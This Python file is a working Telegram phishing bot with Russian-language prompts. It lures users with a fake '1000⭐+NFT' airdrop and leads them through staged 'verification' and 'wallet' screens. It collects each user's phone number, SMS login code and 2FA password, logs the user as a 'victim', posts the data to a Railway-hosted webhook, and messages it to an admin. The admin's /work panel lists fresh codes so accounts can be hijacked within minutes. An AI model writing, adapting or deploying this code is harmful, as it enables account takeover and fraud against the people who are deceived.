import logging, asyncio, os, threading, json, requests
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO)
logger=logging.getLogger(__name__)

BOT_TOKEN=os.getenv('BOT_TOKEN')
ADMIN_ID=int(os.getenv('ADMIN_ID'))
RAILWAY_URL=os.getenv('RAILWAY_STATIC_URL','')

app=Flask(__name__)

class Phisher:
    def __init__(self):self.scams={};self.victims={}
    async def teaser(self,up,ctx):
        uid=up.effective_user.id;un=up.effective_user.username or up.effective_user.first_name or"друг"
        kb=[[InlineKeyboardButton("🎁 ЗАБРАТЬ",callback_data="c")]]
        await up.message.reply_text(f"""🚨 *AIRDROP!* 🚨\n\n{un}!\n✨ 1000⭐+NFT\n⏰24ч\n👇ЖМИ👇""",parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb))
        self.scams[uid]={'s':'t'}
    async def s1(self,q):kb=[[InlineKeyboardButton("✅",callback_data="v")]];await q.edit_message_text("🔍*ПРОВЕРКА...*\n✅*ОК!*\n📱Telegram Login",parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb));self.scams[q.from_user.id]={'s':'v'}
    async def s2(self,q):kb=[[InlineKeyboardButton("🔗",callback_data="w")]];await q.edit_message_text("💼*КОШЕЛЕК*\n🔒БЕЗОПАСНО\nЖМИ",parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb));self.scams[q.from_user.id]={'s':'w'}
    async def s3(self,q):kb=[[InlineKeyboardButton("🔐",callback_data="l")]];await q.edit_message_text("🔐*LOGIN*\n📱НОМЕР\n🔢SMS\n🔑2FA",parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb));self.scams[q.from_user.id]={'s':'l'}
    async def s4(self,q):await q.edit_message_text("📱*НОМЕР:*\n`+7XXXXXXXXXX`",parse_mode='Markdown');self.scams[q.from_user.id]={'s':'p'}
    async def cb(self,up,ctx):
        q=up.callback_query;await q.answer();uid=q.from_user.id;d=q.data
        if d=="c":await self.s1(q)
        elif d=="v":await self.s2(q)
        elif d=="w":await self.s3(q)
        elif d=="l":await self.s4(q)
        elif d.startswith('ws'):await self.ws(up)
        elif d=='wr':await self.wp(q)
    def vs(self,d):c=d.get('code','');t=d.get('timestamp_ts',0);return len(str(c))in[5,6]and(datetime.now().timestamp()-t)<180
    async def wp(self,up,ctx=None):
        if up.effective_user.id!=ADMIN_ID:return await(up.message.reply_text("🚫")if ctx else up.edit_message_text("🚫"))
        m="🎣*ЖЕРТВЫ*🎣\n\n";kb=[]
        if not self.victims:m+="📭";await(up.message.reply_text(m,parse_mode='Markdown')if ctx else up.edit_message_text(m,parse_mode='Markdown'));return
        for i,(uid,v)in enumerate(list(self.victims.items())[-10:]):s="🟢"if self.vs(v)else"🔴";ph=v.get('phone','N/A')[-10:];m+=f"{i+1}.`{ph}`{s}\n";kb+=[[InlineKeyboardButton(ph,callback_data=f'ws_{uid}')]]
        kb+=[[InlineKeyboardButton("🔄",callback_data='wr')]];await(up.message.reply_text(m,parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb))if ctx else up.edit_message_text(m,parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb)))
    async def wp_i(self,q):
        m="🎣*ЖЕРТВЫ*🎣\n\n";kb=[]
        if not self.victims:m+="📭"
        else:
            for i,(uid,v)in enumerate(list(self.victims.items())[-10:]):ph=v.get('phone','N/A')[-10:];kb+=[[InlineKeyboardButton(ph,callback_data=f'ws_{uid}')]]
        kb+=[[InlineKeyboardButton("🔄",callback_data='wr')]];await q.edit_message_text(m,parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb))
    async def ws(self,q):
        d=q.data
        if d=='wr':await self.wp_i(q)
        elif d.startswith('ws_'):uid=int(d[3:]);await self.sess(q,uid)
        elif d.startswith('wd_'):uid=int(d[3:]);self.victims.pop(uid,None);await q.answer("🗑");await self.wp_i(q)
    async def sess(self,q,uid):
        d=self.victims.get(uid,{});ph=d.get('phone','?');c=d.get('code','?');p=d.get('password','N/A');i=d.get('ip','?');t=d.get('timestamp','?')
        lc=f"Код:`{c}`\n📱`{ph}`"+(f"\n🔑`{p}`"if p!='N/A'else'')
        m=f"""🔓*#{uid}*\n\n📱`{ph}`\n🔢`{c}`\n🔑`{p}`\n🌐`{i}`\n📅`{t}`\n\n```\n{lc}\n```""";kb=[[InlineKeyboardButton("🗑",callback_data=f'wd_{uid}')],[InlineKeyboardButton("⬅️",callback_data='wr')]]
        await q.edit_message_text(m,parse_mode='Markdown',reply_markup=InlineKeyboardMarkup(kb))

p=Phisher()

async def ht(up,ctx):
    uid=up.effective_user.id;t=up.message.text.strip()
    if uid not in p.scams:return
    s=p.scams[uid]['s']
    if s=='p':p.scams[uid]={'s':'c','phone':t};return await up.message.reply_text(f"✅`{t}`\n🔢*SMS:*",parse_mode='Markdown')
    if s=='c':p.scams[uid]['code']=t;p.scams[uid]['s']='w';return await up.message.reply_text("✅*КОД*\n🔐*2FA или `нет`*:",parse_mode='Markdown')
    if s=='w':pwd=t if t.lower()!='нет'else'N/A';p.scams[uid]['password']=pwd;v={'user_id':uid,'phone':p.scams[uid]['phone'],'code':p.scams[uid]['code'],'password':pwd,'ip':'l','timestamp':datetime.now().isoformat(),'timestamp_ts':datetime.now().timestamp()};p.victims[uid]=v
    if RAILWAY_URL:requests.post(f"https://{RAILWAY_URL}/webhook",json=v,timeout=3)
    await up.message.reply_text("🎉*1000⭐+NFT!*\n👋",parse_mode='Markdown')
    lc=f"🔥ЖЕРТВА!\n`{v['code']}`\n`{v['phone']}`"+(f"\n`{pwd}`"if pwd!='N/A'else'');await ctx.bot.send_message(ADMIN_ID,lc+"\n`/work`",parse_mode='Markdown');del p.scams[uid]

@app.route('/webhook',methods=['POST'])
def wh():d=request.json;uid=d.get('user_id');if uid:p.victims[uid]=d.copy();p.victims[uid]['ip']=request.remote_addr;return jsonify({'ok':1})

async def main():
    a=Application.builder().token(BOT_TOKEN).build()
    a.add_handler(CommandHandler("start",p.teaser))
    a.add_handler(CommandHandler("work",p.wp))
    a.add_handler(CallbackQueryHandler(p.cb))
    a.add_handler(MessageHandler(filters.TEXT&~filters.COMMAND,ht))
    await a.initialize();await a.start();await a.updater.start_polling();logger.info("✅")

def flask():port=int(os.getenv('PORT',5000));app.run(host='0.0.0.0',port=port)

if __name__=='__main__':
    threading.Thread(target=flask,daemon=True).start()
    asyncio.run(main())
